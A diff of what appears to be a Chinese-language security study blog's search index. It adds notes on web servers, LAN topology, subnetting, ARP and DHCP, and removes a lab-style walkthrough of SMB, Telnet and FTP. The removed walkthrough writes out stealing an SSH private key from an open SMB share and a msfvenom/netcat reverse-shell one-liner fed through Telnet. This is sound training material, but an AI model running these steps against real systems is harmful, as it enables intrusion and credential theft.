-]]></content>
-      <categories>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>Python库</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Requests</title>
     <url>/2024/10/29/%E5%B7%A5%E5%85%B7Requests/</url>
     <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/psf/requests">Requests</a><br><br></p>
@@ -1743,6 +1926,47 @@
       <tags>
         <tag>Python库</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>整合全部内容</title>
+    <url>/2024/11/04/T2-%E5%9F%BA%E7%A1%80%E6%8A%80%E8%83%BD10/</url>
+    <content><![CDATA[<h2 id="整合所有内容"><a href="#整合所有内容" class="headerlink" title="整合所有内容"></a>整合所有内容</h2><p>通过之前的模块，已经了解到，当在浏览器中请求一个网页时，背后会发生很多过程。</p>
+<p>当请求一个网站时，计算机需要知道要通信的服务器的IP地址；为此，它会使用DNS。计算机会通过一组称为HTTP协议的特殊指令与网络服务器通信；网络服务器随后返回HTML、JavaScript、CSS、图像等资源，浏览器则利用这些资源来正确地格式化并显示网站。</p>
+<p>还有一些其他组件可以帮助网络更高效地运行，并提供附加功能。<br><br></p>
+<h2 id="其他组件"><a href="#其他组件" class="headerlink" title="其他组件"></a>其他组件</h2><h3 id="负载均衡器"><a href="#负载均衡器" class="headerlink" title="负载均衡器"></a>负载均衡器</h3><p>当网站流量变大，或需要高可用性的应用程序时，单个服务器可能无法满足需求。负载均衡器提供两项主要功能：确保高流量网站能够处理负载，并在某个服务器无响应时提供故障切换。</p>
+<p>当您请求一个有负载均衡器的网站时，负载均衡器会先接收请求，然后将其转发给其后方的多台服务器之一。负载均衡器使用不同的算法来选择最适合处理请求的服务器。例如，轮询算法会依次将请求分配给每个服务器；加权算法会检查每台服务器当前处理的请求数，并将请求发送到最闲的服务器。</p>
+<p>负载均衡器还会定期与每台服务器进行健康检查，以确保其正常运行。如果某台服务器未能正确响应，负载均衡器将停止向其发送流量，直到该服务器恢复正常。</p>
+<h3 id="内容分发网络（CDN）"><a href="#内容分发网络（CDN）" class="headerlink" title="内容分发网络（CDN）"></a>内容分发网络（CDN）</h3><p>CDN可以有效减少繁忙网站的流量。它允许您将网站的静态文件（如JavaScript、CSS、图片、视频等）托管在全球成千上万台服务器上。当用户请求这些文件时，CDN会选择距离用户最近的服务器进行响应，而不必让请求跨越全球。</p>
+<h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><p>许多网站需要一种方式来存储用户数据。网络服务器可以通过数据库来存储和检索数据。数据库的形式可以从简单的纯文本文件到复杂的多服务器集群，以提供速度和稳定性。常见的数据库类型包括：MySQL、MSSQL、MongoDB、Postgres等，每种数据库都有其独特的功能。</p>
+<h3 id="网络应用防火墙（WAF）"><a href="#网络应用防火墙（WAF）" class="headerlink" title="网络应用防火墙（WAF）"></a>网络应用防火墙（WAF）</h3><p>WAF位于网络请求和服务器之间，主要目的是保护服务器免受黑客攻击或拒绝服务攻击。它会分析网络请求，以检测常见的攻击方式，并判断请求是否来自真实的浏览器而不是机器人。WAF还会通过“速率限制”来控制每秒每个IP的请求数量，以防止过量请求。如果某个请求被视为潜在攻击，WAF将丢弃该请求，不会将其发送到服务器。</p>
+<br>
+
+
+
+
+
+<h2 id="网络服务器的工作原理"><a href="#网络服务器的工作原理" class="headerlink" title="网络服务器的工作原理"></a>网络服务器的工作原理</h2><h3 id="什么是网络服务器？"><a href="#什么是网络服务器？" class="headerlink" title="什么是网络服务器？"></a>什么是网络服务器？</h3><p>网络服务器是一种监听传入连接的软件，它通过HTTP协议向客户端传送网页内容。常见的网络服务器软件包括Apache、Nginx、IIS和NodeJS。网络服务器会从“根目录”提供文件，这个根目录在软件设置中定义。例如，在Linux系统中，Nginx和Apache的默认根目录是&#x2F;var&#x2F;www&#x2F;html，而在Windows系统中，IIS的根目录是C:\inetpub\wwwroot。如果请求<a href="http://www.example.com/picture.jpg%EF%BC%8C%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BC%9A%E4%BB%8E%E6%9C%AC%E5%9C%B0%E7%A1%AC%E7%9B%98%E7%9A%84/var/www/html/picture.jpg%E4%B8%AD%E4%BC%A0%E9%80%81%E8%AF%A5%E6%96%87%E4%BB%B6%E3%80%82">http://www.example.com/picture.jpg，服务器会从本地硬盘的/var/www/html/picture.jpg中传送该文件。</a></p>
+<h3 id="虚拟主机"><a href="#虚拟主机" class="headerlink" title="虚拟主机"></a>虚拟主机</h3><p>网络服务器可以通过虚拟主机托管多个不同域名的网站。服务器软件会检查HTTP头中的主机名，并与其虚拟主机配置进行匹配（虚拟主机是基于文本的配置文件）。如果找到匹配的主机名，则提供对应的网站；如果没有匹配，则提供默认网站。</p>
+<p>虚拟主机可以将根目录映射到硬盘上的不同位置。例如，one.com映射到&#x2F;var&#x2F;www&#x2F;website_one，而two.com映射到&#x2F;var&#x2F;www&#x2F;website_two。</p>
+<p>理论上，网络服务器可以托管的不同网站数量没有限制。</p>
+<h3 id="静态内容与动态内容"><a href="#静态内容与动态内容" class="headerlink" title="静态内容与动态内容"></a>静态内容与动态内容</h3><p>静态内容是指永远不变的内容，常见的例子包括图片、JavaScript、CSS等，也可能包含永不改变的HTML文件。这些文件会直接从服务器传递，未经修改。</p>
+<p>动态内容是指根据不同请求而变化的内容。比如，博客的主页会显示最新的文章条目；如果有新文章发布，主页将更新为最新条目。搜索页面也会根据搜索词显示不同结果。</p>
+<p>这些动态变化由后台通过编程和脚本语言实现。称为“后台”（Backend）处理，是因为所有操作都在幕后完成。用户看不到后台的处理代码，只能看到最终呈现的HTML结果。用户在浏览器中看到的内容称为“前端”（Frontend）。</p>
+<h3 id="脚本语言和后台语言"><a href="#脚本语言和后台语言" class="headerlink" title="脚本语言和后台语言"></a>脚本语言和后台语言</h3><p>后台语言的功能几乎没有限制，能够使网站具备交互功能。常见的后台语言（无特定顺序）包括PHP、Python、Ruby、NodeJS和Perl等。这些语言可以与数据库交互，调用外部服务，处理用户数据等等。以下是一个简单的PHP示例：</p>
+<p>假设您请求网址<a href="http://example.com/index.php?name=adam">http://example.com/index.php?name=adam</a></p>
+<p>如果index.php文件内容如下：</p>
+<p>php</p>
+<html><body>Hello <?php echo $_GET["name"]; ?></body></html>
+那么服务器返回给客户端的内容是：
+
+<p>html</p>
+<html><body>Hello adam</body></html>
+
+<p>客户端看不到任何PHP代码，因为这些代码在后台执行。这种交互性为未安全开发的网络应用程序带来了许多安全问题，您将在后续模块中了解这些问题。<br><br></p>
+]]></content>
+      <categories>
+        <category>基础技能</category>
+      </categories>
   </entry>
   <entry>
     <title>Scapy</title>
@@ -1768,13 +1992,11 @@
     <url>/2024/10/27/%E5%B7%A5%E5%85%B7theHarvester/</url>
     <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/laramies/theHarvester">theHarvester</a><br><br></p>
 <h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>theHarvester 是一款简单易用但功能强大的工具，旨在用于红队评估或渗透测试的侦察阶段。它执行开源情报 (OSINT) 收集，以帮助确定域的外部威胁状况。该工具使用多种公共资源收集名称、电子邮件、IP、子域和 URL<br><br></p>
-<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">theHarvester -h</span><br><span class="line"><span class="comment"># Kali Linux 运行</span></span><br></pre></td></tr></table></figure>
-
+<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><p>Kali Linux 自带<br><br></p>
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">theHarvester -h</span><br><span class="line"><span class="comment"># Kali Linux Terminal 运行</span></span><br></pre></td></tr></table></figure>
 <br>
 
-
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>
-
+<!-- 成功搭建✔，成功使用✔ -->
 
 ]]></content>
       <categories>
@@ -1804,152 +2026,139 @@
       </tags>
   </entry>
   <entry>
+    <title>Snort</title>
+    <url>/2024/11/01/%E7%BD%91%E7%AB%99Snort/</url>
+    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><p><a href="https://www.snort.org/">Snort</a><br><br></p>
+<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><br>
+
+
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>
+
+
+]]></content>
+      <categories>
+        <category>网站</category>
+      </categories>
+      <tags>
+        <tag>防火墙</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>局域网简介</title>
+    <url>/2024/10/30/T2-%E5%9F%BA%E6%9C%AC%E6%8A%80%E8%83%BD4-2/</url>
+    <content><![CDATA[<h2 id="局域网（LAN）拓扑结构介绍"><a href="#局域网（LAN）拓扑结构介绍" class="headerlink" title="局域网（LAN）拓扑结构介绍"></a>局域网（LAN）拓扑结构介绍</h2><p><strong>拓扑</strong>指网络的设计或布局，描述网络中各设备如何相互连接和组织</p>
+<h3 id="星型拓扑"><a href="#星型拓扑" class="headerlink" title="星型拓扑"></a>星型拓扑</h3><p>星型拓扑的核心概念是每个网络设备都独立地连接到一个中央网络设备上。由于所有设备的通信都需要通过中央设备，这种拓扑具备良好的可靠性和扩展性，但也需要更多的布线和专用网络设备，成本比其他拓扑结构更高</p>
+<p>尽管星型拓扑的可靠性相对较高，但中央设备仍然存在故障风险</p>
+<h3 id="总线型拓扑"><a href="#总线型拓扑" class="headerlink" title="总线型拓扑"></a>总线型拓扑</h3><p>总线型拓扑依赖于一根称为主干电缆的连接，各设备通过分支连接到这条主干电缆上。由于所有设备共享同一条通信路径，若多个设备同时请求数据，会导致网络速度下降和瓶颈问题。这种单一数据路径会导致故障排查非常困难，很难确定哪个设备出现了问题</p>
+<p>总线型拓扑具有成本优势，结构简单且经济。但缺乏冗余来应对故障，缺点是因为主干电缆上有一个单点故障，一旦电缆损坏，所有设备都无法通信</p>
+<h3 id="环形拓扑"><a href="#环形拓扑" class="headerlink" title="环形拓扑"></a>环形拓扑</h3><p>环形拓扑&#x2F;令牌拓扑是一种闭环结构，所有设备直接连接成一个环，所需布线较少，不依赖中央设备或专用硬件。在环形拓扑中，数据沿着环路依次传输，直到到达目标设备。每台设备在没有数据要发送时会转发接收到的数据，如果有数据要发送，则优先发送自己的数据，再转发其他设备的数据。</p>
+<p>这种结构只能单向传输，因此故障排查相对容易。数据需要经过多个设备才能到达目标设备，传输效率较低。</p>
+<p>环形拓扑不容易出现网络瓶颈，因为不会同时传输大量数据。其设计意味着任何设备或连接出现故障都会中断整个环路，使网络中断</p>
+<h3 id="什么是交换机（Switch）？"><a href="#什么是交换机（Switch）？" class="headerlink" title="什么是交换机（Switch）？"></a>什么是交换机（Switch）？</h3><p>交换机是用于网络中的专用设备，通过以太网端口聚合多个设备，常用于需要连接大量设备的大型网络。交换机有多种规格，通常提供4、8、16、24、32或64个端口，以便于连接多个设备</p>
+<p>与集线器相比，交换机更高效，它能记录每个设备连接的端口。当接收到数据包时，交换机会将数据包直接发送到目标设备的端口，而非广播到所有端口，有效减少网络流量</p>
+<p>交换机和路由器可以互相连接，这种连接增加了网络的冗余性，因为为数据提供了多条传输路径。一旦某条路径故障，流量可转向备用路径，减少网络停机风险，但会带来些许性能损耗。</p>
+<h3 id="什么是路由器？"><a href="#什么是路由器？" class="headerlink" title="什么是路由器？"></a>什么是路由器？</h3><p>路由器的任务是连接不同的网络并在它们之间传输数据。它通过路由技术选择最佳路径，以便数据能有效地在网络间传输</p>
+<p>路由是指数据在网络间传输的路径选择过程。当存在多条连接路径时，它确保数据沿最佳路径传送，提高传输效率和网络可靠性</p>
+<br>
+
+
+
+
+
+<h2 id="子网划分基础知识"><a href="#子网划分基础知识" class="headerlink" title="子网划分基础知识"></a>子网划分基础知识</h2><p>网络的规模从小型到大型不等。子网划分（Subnetting）是将一个网络分成多个更小的子网络的过程，网络管理员通过子网划分来将网络的特定部分分配给不同部门，以便更好地管理和分类。</p>
+<p>子网划分通过限制主机数量来实现，划分的数量由“子网掩码”决定。IP 地址和子网掩码由 . 区分包含4个字节或部分，每个字节或部分为 8 bit，总共 32 bit，每个部分的取值范围是0到255。</p>
+<p>子网通过以下三种方式使用 IP 地址：</p>
+<p>标识网络地址<br>标识主机地址<br>标识默认网关</p>
+<p>将这三种用途分开理解，并通过下表来进行说明：</p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>目的</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>网络地址</td>
+<td>标识网络的起始位置，标识网络的存在</td>
+<td>IP 地址为 192.168.1.100 的设备将位于 192.168.1.0 标识的网络上</td>
+</tr>
+<tr>
+<td>主机地址</td>
+<td>用于标识子网中的设备</td>
+<td>192.168.1.0网络中的设备可以被分配IP地址192.168.1.80</td>
+</tr>
+<tr>
+<td>默认网关</td>
+<td>网络中设备的特殊地址，用于将信息发送到其他网络</td>
+<td>需要发送到不同网络的数据会被转发至默认网关。网关地址通常使用网络中的第一个或最后一个主机地址192.168.1.1或192.168.1.254</td>
+</tr>
+</tbody></table>
+<p>在小型网络中常只使用一个子网，因为连接的设备数量不会超过254个 IP 地址</p>
+<p>子网划分提供好处：</p>
+<p>提高效率<br>提升安全性<br>实现控制性</p>
+<br>
+
+
+
+
+
+<h2 id="地址解析协议（ARP）"><a href="#地址解析协议（ARP）" class="headerlink" title="地址解析协议（ARP）"></a>地址解析协议（ARP）</h2><p>每个网络设备都有两个标识符：MAC地址和IP地址。地址解析协议（Address Resolution Protocol，ARP）用于将设备的IP地址与其MAC地址关联的协议，以在网络中识别和定位设备</p>
+<p>当设备需要与另一设备通信时，会使用ARP协议通过广播方式，询问目标IP地址的MAC地址。目标设备接收到请求后，将其MAC地址发送回请求设备。设备会将此IP地址与MAC地址的关联信息记录在其ARP缓存中，避免以后通信需要重复广播</p>
+<h3 id="ARP如何工作？"><a href="#ARP如何工作？" class="headerlink" title="ARP如何工作？"></a>ARP如何工作？</h3><p>每个设备都有一个用于存储信息的缓存，该缓存用于存储其他网络设备的IP地址和MAC地址的关联信息</p>
+<p>为了建立IP地址与MAC地址的关联，ARP协议发送两种类型的消息：</p>
+<p>ARP请求：设备会向网络广播一条请求，询问拥有这个 IP 地址的 MAC 地址是什么<br>ARP回复：只有拥有该IP地址的设备会回应，发送包含其MAC地址的ARP回复。发送请求的设备随后会将这个IP-MAC地址映射记录在ARP缓存中将来使用</p>
+<p>这种机制使得设备能够快速查找和联系目标设备，而无需重复广播查询<br><br></p>
+<h2 id="动态主机配置协议（DHCP）"><a href="#动态主机配置协议（DHCP）" class="headerlink" title="动态主机配置协议（DHCP）"></a>动态主机配置协议（DHCP）</h2><p>IP 地址可通过手动分配或动态主机配置协议（DHCP）服务器自动分配。当设备连接到网络时，如果没手动分配IP地址，它会发送 DHCP 发现（DHCP Discover）请求，询问网络上是否有可用的DHCP服务器。</p>
+<p>DHCP服务器接收到该请求后，会回复DHCP提供（DHCP Offer）消息，提供可用的IP地址。设备随后发送DHCP请求（DHCP Request）消息，表示它希望使用这个IP地址。最后，DHCP服务器发送DHCP确认（DHCP ACK）消息，设备便可以使用该IP地址来进行通信</p>
+<p>这四个步骤（Discover、Offer、Request、ACK）完成后，设备即可使用分配到的IP地址，无需手动配置<br><br></p>
+]]></content>
+      <categories>
+        <category>基本技能</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Pwntools</title>
+    <url>/2024/10/29/%E5%B7%A5%E5%85%B7Pwntools/</url>
+    <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/Gallopsled/pwntools">Pwntools</a><br><br></p>
+<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>Pwntools 是一个 CTF 框架和漏洞开发库。它用 Python 编写，旨在快速进行原型设计和开发，并旨在使漏洞编写尽可能简单。<br><br></p>
+<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><br>
+
+
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>
+
+
+]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>Python库</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>OSINT Framework</title>
     <url>/2024/10/27/%E7%BD%91%E7%AB%99OSINT_Framework/</url>
     <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><p><a href="https://osintframework.com/">OSINT Framework</a><br><br></p>
-<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>提供了基于各种类别的 OSINT 工具集合<br><br></p>
+<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>提供多种 OSINT 工具，分类方便使用<br><br></p>
 <h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>点击即用<br><br></p>
+<!-- 成功使用✔ -->
 ]]></content>
       <categories>
         <category>网站</category>
       </categories>
   </entry>
   <entry>
-    <title>网络服务</title>
-    <url>/2024/11/02/T2-%E5%9F%BA%E7%A1%80%E6%8A%80%E8%83%BD5/</url>
-    <content><![CDATA[<h2 id="服务器消息块协议（SMB）"><a href="#服务器消息块协议（SMB）" class="headerlink" title="服务器消息块协议（SMB）"></a>服务器消息块协议（SMB）</h2><p>服务器消息块协议 (SMB) 是用于在客户端和服务器之间共享文件、打印机、端口以及其他资源访问的通信协议。通过 SMB 协议，服务器可通过网络向客户端提供文件系统和资源的访问权限，客户端则可以访问服务器上的共享文件和打印机。</p>
-<p>SMB 是一种请求-响应协议，通过在客户端和服务器之间交换消息来建立连接。客户端常通过 TCP&#x2F;IP 协议与服务器连接</p>
-<h3 id="SMB-是如何工作的？"><a href="#SMB-是如何工作的？" class="headerlink" title="SMB 是如何工作的？"></a>SMB 是如何工作的？</h3><p>建立连接后，客户端通过发送 SMB 命令来访问服务器上的共享资源，执行文件的打开、读写等操作，所有这些文件系统操作都通过网络完成。</p>
-<h3 id="什么系统支持-SMB？"><a href="#什么系统支持-SMB？" class="headerlink" title="什么系统支持 SMB？"></a>什么系统支持 SMB？</h3><p>自 Windows 95 起，Microsoft Windows 操作系统就内置了 SMB 协议的客户端和服务器支持。对于 Unix 系统，Samba 是一个支持 SMB 协议的开源服务器，用于在 Unix 和 Windows 系统之间共享文件和资源。<br><br></p>
-<h2 id="SMB-枚举"><a href="#SMB-枚举" class="headerlink" title="SMB 枚举"></a>SMB 枚举</h2><h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>枚举是指收集目标系统信息的过程种发现潜在的攻击面，从而有效地进行漏洞利用。攻击者可以收集诸如用户名、密码、网络信息、主机名、应用程序数据、服务等关键信息，避免在无效漏洞利用上浪费时间和资源。</p>
-<h3 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h3><p>服务器通常提供可连接的 SMB 共享驱动器，用户可以通过这些共享访问或传输文件。SMB 常是攻击者获取敏感信息的首要入口</p>
-<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>枚举的第一步通常是端口扫描，以识别目标机器上开放的端口和运行的服务。帮助收集关于服务、应用程序、网络结构和操作系统的信息。</p>
-<h3 id="Enum4Linux"><a href="#Enum4Linux" class="headerlink" title="Enum4Linux"></a>Enum4Linux</h3><p>Enum4Linux 是一个用于在 SMB 协议上枚举 Windows 和 Linux 系统共享资源的工具。它整合了 Samba 工具包中的功能，能快速提取 SMB 相关信息</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">enum4linux -a 10.10.118.119</span><br><span class="line"><span class="comment"># enum4linux [选项] [目标 IP]</span></span><br></pre></td></tr></table></figure>
-
-<table>
-<thead>
-<tr>
-<th>标签</th>
-<th>功能</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>-U</td>
-<td>获取用户列表</td>
-</tr>
-<tr>
-<td>-M</td>
-<td>获取机器列表</td>
-</tr>
-<tr>
-<td>-N</td>
-<td>获取名称列表（不同于 -U 和 -M）</td>
-</tr>
-<tr>
-<td>-S</td>
-<td>获取共享列表</td>
-</tr>
-<tr>
-<td>-P</td>
-<td>获取密码策略信息</td>
-</tr>
-<tr>
-<td>-G</td>
-<td>获取组和成员列表</td>
-</tr>
-<tr>
-<td>-a</td>
-<td>启用上述所有选项（枚举所有）</td>
-</tr>
-</tbody></table>
-<br>
-
-
-
-
-
-<h2 id="SMB-利用"><a href="#SMB-利用" class="headerlink" title="SMB 利用"></a>SMB 利用</h2><h3 id="SMB-漏洞类型"><a href="#SMB-漏洞类型" class="headerlink" title="SMB 漏洞类型"></a>SMB 漏洞类型</h3><p>通过系统配置错误进入系统是常见的安全漏洞，这种错误配置可能允许攻击者获取系统控制所需的信息。</p>
-<p>常见的 SMB 信息：<br>SMB 共享的位置<br>SMB 共享名称<br>SMBClient 使用</p>
-<p>SMBClient 是 Samba 套件中的工具，用于访问 SMB 共享。可使用 SMBClient 访问通过 SMB 枚举发现的共享文件夹</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient //10.10.118.119/profiles</span><br><span class="line"><span class="comment"># smbclient //[目标 IP]/[文件名]</span></span><br><span class="line"><span class="comment"># 通过枚举的文件名，执行命令看看有没有允许匿名访问权限</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> .ssh</span><br><span class="line"><span class="comment"># 找到敏感信息</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;id_rsa&quot;</span></span><br><span class="line"><span class="comment"># 下载ssh里面id_rsa到本地</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> 600 id_rsa</span><br><span class="line"><span class="comment"># 设置id_rsa文件的权限，只有文件的所有者可读写，其他用户无法访问</span></span><br><span class="line"></span><br><span class="line">ssh -i id_rsa cactus@10.10.118.119</span><br><span class="line"><span class="comment"># ssh -i id_rsa [用户名]@[目标 IP]</span></span><br><span class="line"><span class="comment"># 使用id_rsa文件配合用户名和 IP 进行 ssh 连接</span></span><br></pre></td></tr></table></figure>
-
-<p>SMBClient 可用选项：</p>
-<table>
-<thead>
-<tr>
-<th>标签</th>
-<th>功能</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>-U [name]</td>
-<td>指定用户名</td>
-</tr>
-<tr>
-<td>-p [port]</td>
-<td>指定端口</td>
-</tr>
-</tbody></table>
-<br>
-
-
-
-
-
-<h2 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h2><h3 id="Telnet-是什么？"><a href="#Telnet-是什么？" class="headerlink" title="Telnet 是什么？"></a>Telnet 是什么？</h3><p>Telnet 是一种应用层协议，允许用户通过 Telnet 客户端连接到远程主机，并在该主机上执行命令。前提是远程主机正在运行 Telnet 服务器。建立连接后，客户端会作为虚拟终端，用户可以通过它与远程主机交互。</p>
-<h3 id="替代"><a href="#替代" class="headerlink" title="替代"></a>替代</h3><p>Telnet 以明文传输所有数据，缺乏安全机制，已在许多应用中被 SSH 替代。</p>
-<h3 id="Telnet-如何工作？"><a href="#Telnet-如何工作？" class="headerlink" title="Telnet 如何工作？"></a>Telnet 如何工作？</h3><p>用户通过 Telnet 客户端连接到服务器，并可在连接后使用特定命令在服务器上执行指令。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">telnet 10.10.200.228 8012</span><br><span class="line"><span class="comment"># telnet [目标 IP] [端口]</span></span><br></pre></td></tr></table></figure>
-
-<br>
-
-
-
-
-
-<h2 id="Telnet-枚举"><a href="#Telnet-枚举" class="headerlink" title="Telnet 枚举"></a>Telnet 枚举</h2><h3 id="枚举-1"><a href="#枚举-1" class="headerlink" title="枚举"></a>枚举</h3><p>在利用配置错误的网络服务时，潜在的漏洞不容易发现。枚举网络服务时，需确保不遗漏任何信息</p>
-<h3 id="端口扫描-1"><a href="#端口扫描-1" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>通过端口扫描来识别目标机器上运行的服务、应用程序、系统结构和操作系统，获取尽可能多的基础信息<br><br></p>
-<h2 id="Telnet-利用"><a href="#Telnet-利用" class="headerlink" title="Telnet 利用"></a>Telnet 利用</h2><h3 id="Telnet-漏洞类型"><a href="#Telnet-漏洞类型" class="headerlink" title="Telnet 漏洞类型"></a>Telnet 漏洞类型</h3><p>Telnet 协议本身存在安全缺陷，缺乏加密功能，所有通信均以明文传输，且访问控制机制较弱。针对 Telnet 的漏洞较多，公开漏洞（CVE）库中包含了多个 Telnet 相关的漏洞 ID。能发现 Telnet 配置错误或运行不当进行利用</p>
-<h3 id="方法分解"><a href="#方法分解" class="headerlink" title="方法分解"></a>方法分解</h3><p>根据在枚举阶段收集的信息：</p>
-<p>获取额外信息<br>尝试访问 Telnet 端口</p>
-<p>利用收集的信息，尝试连接和进一步获取权限，直至获得反向 Shell。</p>
-<h3 id="什么是反向-Shell？"><a href="#什么是反向-Shell？" class="headerlink" title="什么是反向 Shell？"></a>什么是反向 Shell？</h3><p>Shell 是用于在目标设备上获得代码或命令执行权限的代码或程序</p>
-<p>反向 Shell 是 Shell 类型的一种，目标机器会主动向攻击者的机器发起连接。攻击者监听本地的一个端口，通过该端口接收连接，从而实现代码或命令的执行</p>
-<h3 id="连接到-Telnet"><a href="#连接到-Telnet" class="headerlink" title="连接到 Telnet"></a>连接到 Telnet</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">telnet 10.10.44.79 8012</span><br><span class="line"><span class="comment"># telnet [目标 IP] [端口]</span></span><br><span class="line"><span class="comment"># 执行命令但无回显</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> tcpdump ip proto \\icmp -i ens5</span><br><span class="line"><span class="comment"># 另启窗口，进行监听，配合一下命令查看是否能收到 ping 消息</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.RUN ping 10.10.22.30 -c 1</span><br><span class="line"><span class="comment"># 在 telnet 尝试 ping 本机，查看目标主机命令是否能执行命令，能执行就可以进行下一步开始制作反向shell</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msfvenom -p cmd/unix/reverse_netcat lhost=10.10.44.176 lport=4444 R</span><br><span class="line"><span class="comment"># msfvenom -p cmd/unix/reverse_netcat lhost=[本机 IP] lport=[监听端口] R</span></span><br><span class="line"><span class="comment"># 另启窗口，使用msfvenom制作反向shell</span></span><br><span class="line"><span class="comment"># -p = 有效载荷</span></span><br><span class="line"><span class="comment"># R = 以原始格式导出有效载荷</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得反向shell：mkfifo /tmp/dxtpdlx; nc 10.10.22.30 4444 0&lt;/tmp/dxtpdlx | /bin/sh &gt;/tmp/dxtpdlx 2&gt;&amp;1; rm /tmp/dxtpdlx</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nc -lvp 4444</span><br><span class="line"><span class="comment"># 另启窗口，监听本地 4444 端口</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.RUN <span class="built_in">mkfifo</span> /tmp/dxtpdlx; nc 10.10.22.30 4444 0&lt;/tmp/dxtpdlx | /bin/sh &gt;/tmp/dxtpdlx 2&gt;&amp;1; <span class="built_in">rm</span> /tmp/dxtpdlx</span><br><span class="line"><span class="comment"># 在 telnet 输入反向shell命令获得权限</span></span><br></pre></td></tr></table></figure>
-<br>
-
-
-
-
-
-<h2 id="文件传输协议（FTP）"><a href="#文件传输协议（FTP）" class="headerlink" title="文件传输协议（FTP）"></a>文件传输协议（FTP）</h2><h3 id="文件传输协议（FTP）是什么？"><a href="#文件传输协议（FTP）是什么？" class="headerlink" title="文件传输协议（FTP）是什么？"></a>文件传输协议（FTP）是什么？</h3><p>文件传输协议 (FTP) 是一种用于在网络上远程传输文件的协议。它采用客户端-服务器模式，通过独立的命令和数据通道来实现高效的文件传输。</p>
-<h3 id="FTP如何工作？"><a href="#FTP如何工作？" class="headerlink" title="FTP如何工作？"></a>FTP如何工作？</h3><p>典型的 FTP 会话使用两个通道：</p>
-<p>命令通道（控制通道）：传输命令和命令的响应<br>数据通道：传输文件数据</p>
-<p>FTP 基于客户端-服务器协议。客户端发起与服务器的连接，服务器验证提供的登录凭据，成功后开启会话。会话建立后，客户端可以在服务器上执行各种 FTP 命令。</p>
-<h3 id="主动模式-vs-被动模式"><a href="#主动模式-vs-被动模式" class="headerlink" title="主动模式 vs 被动模式"></a>主动模式 vs 被动模式</h3><p>FTP 服务器可以支持主动（Active）和被动（Passive）模式，或同时支持两者。</p>
-<p>在主动 FTP 连接中，客户端打开一个端口并进行监听，服务器主动连接该端口进行数据传输<br>在被动 FTP 连接中，服务器打开一个端口并被动监听，客户端连接到该端口以传输数据</p>
-<p>将命令和数据划分到不同的通道，可在不等待数据传输完成的情况下向服务器发送命令。提高了大文件传输或慢速网络连接时的效率<br><br></p>
-<h2 id="FTP-枚举"><a href="#FTP-枚举" class="headerlink" title="FTP 枚举"></a>FTP 枚举</h2><h3 id="枚举-2"><a href="#枚举-2" class="headerlink" title="枚举"></a>枚举</h3><p>使用 nmap 进行有效的端口扫描，确认目标服务器上是否开放 FTP 服务。</p>
